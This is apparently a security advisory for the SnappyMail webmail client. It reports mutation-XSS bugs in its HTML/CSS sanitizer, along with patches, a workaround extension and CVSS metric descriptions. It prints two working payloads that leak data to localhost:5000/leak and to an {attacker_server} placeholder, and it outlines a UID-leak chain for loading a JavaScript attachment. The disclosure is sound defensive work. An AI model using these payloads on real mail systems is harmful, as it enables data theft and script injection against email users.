# Multiple mXSS found in HTML sanitizer

## Description

SnappyMail uses [cleanHtml()](https://github.com/the-djmaze/snappymail/blob/master/dev/Common/Html.js) to cleanup HTML and CSS in emails.

Oskar figured out that the function has a few bugs which cause an mXSS exploit.

Because it allowed too many (invalid) HTML elements, it was possible (with incorrect markup) to trick the browser to "fix" the broken markup into valid markup

For example:

```
<math><annotation-xml encoding=text/html><xmp><mtext>
<img style="display: none"
  src='http://localhost:5000/leak?</mtext></xmp></annotation-xml></math><img src="cid:foo"><xmp>'>
</xmp>
```

Results in:

```
<math><annotation-xml encoding=text/html><xmp><mtext>
<img style="display: none"
  src='http://localhost:5000/leak?'>
</mtext></xmp></annotation-xml></math>
<img src="cid:foo">
<xmp></xmp>
```

SnappyMail also cleans up CSS in there.

One of them is an attempt to "fix" Microsoft Outlook/Word emails, as Outlook creates broken HTML like `<style><!-- </style>`

The attempt was incorrect as it created a different issue:

```
<style>
foo { <<!--/style>
<iframe style="display: none" src='data:text/html;charset=ISO-2022-JP,
<img src=&apos;{attacker_server}/leak?\x1b$&commat;
}
</style>
```

Results in:

```
<style>
foo { </style>
<iframe style="display: none" src='data:text/html;charset=ISO-2022-JP,
<img src=&apos;{attacker_server}/leak?\x1b$&commat;

```
### Impact

Due to the default Content Security Policy the impact of the exploit is minimal, though it can lead to XSS in some cases.

It could be possible to create an attack which leaks some data when loading images through the proxy.

This way it might be possible to use the proxy to attack the local system, like with `http://localhost:5000/leak`

An other attack could be to load a JavaScript attachment of the email, leading to XSS.

This is very tricky as the email must link to every possible UID as each email has a unique UID which has a value between 1 and 18446744073709551615.

But this range could be reduced by leaking an email UID and sending a second email containing the first email's UID to load the JS attachment. This requires that the second email is opened in the same mailbox where the first email is.

(See video below as example)

### Patches

**v2.38.0** and up now removes unsupported HTML elements which mitigates the issue

### Workarounds

Older versions can install an extension named "Security mXSS".

This will be available at the administration area at `/?admin#/packages`.

**NOTE:** this extension can not "fix" malicious code in encrypted messages or (html) attachments as it can't manipulate the JavaScript code for this.

It only protects normal message HTML.

You can also rebuild the JavaScript yourself for full protection:

1. get [cfbc474](https://github.com/the-djmaze/snappymail/commit/cfbc47488a6b2e2ae4be484f501ee1a3485f542e)
2. Implement the changes in your code
3. build SnappyMail using `gulp` or create full package using `php cli/release.php`

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
